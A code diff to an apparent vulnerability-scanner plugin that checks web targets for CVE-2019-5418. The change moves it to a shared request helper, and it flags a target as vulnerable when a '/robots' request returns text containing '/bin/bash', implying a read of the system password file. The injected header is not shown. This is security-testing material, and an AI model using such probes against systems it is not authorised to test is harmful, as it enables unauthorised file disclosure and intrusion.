@@ -7,11 +7,9 @@ description: CVE-2019-5418漏洞可读取任意命令,暂时仅限于Linux系统
 
 import time
 import json
-import string
-import random
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+from app.lib.utils.request import request
+
 
 class CVE_2019_5418_BaseVerify:
     def __init__(self, url):
@@ -24,7 +22,7 @@ class CVE_2019_5418_BaseVerify:
         try:
             if not self.url.startswith("http") and not self.url.startswith("https"):
                 self.url = "http://" + self.url
-            check_req = requests.get(self.url + '/robots', headers = self.headers, allow_redirects = False, verify = False)
+            check_req = request.get(self.url + '/robots', headers = self.headers)
             if check_req.status_code == 200 and '/bin/bash' in check_req.text:
                 #print(check_req.text)
                 print('存在CVE-2019-5418漏洞')
